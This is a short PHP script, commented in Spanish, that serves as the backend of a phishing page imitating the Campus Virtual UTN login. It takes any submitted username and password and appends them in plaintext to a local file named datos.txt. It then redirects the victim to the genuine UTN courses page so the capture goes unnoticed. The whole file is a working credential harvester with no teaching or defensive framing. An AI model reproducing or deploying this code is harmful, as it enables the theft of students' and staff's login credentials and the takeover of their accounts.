<?php
// Verificar si los datos fueron enviados por POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verificar si se recibió el nombre de usuario y la contraseña
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Obtener los datos del formulario
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Formato del texto a guardar en el archivo
        $data = "Usuario: " . $username . " | Contraseña: " . $password . "\n";

        // Guardar los datos en un archivo de texto
        if (file_put_contents("datos.txt", $data, FILE_APPEND)) {
            // Redirigir a la página real de Campus Virtual UTN después de capturar los datos
            header("Location: https://campusvirtual.utn.ac.cr/my/courses.php");
            exit();
        } else {
            echo "Hubo un problema al guardar los datos. Por favor, inténtalo nuevamente.";
        }
    } else {
        echo "Datos incompletos. Por favor, ingresa todos los campos.";
    }
} else {
    echo "Acceso no permitido.";
}
?>
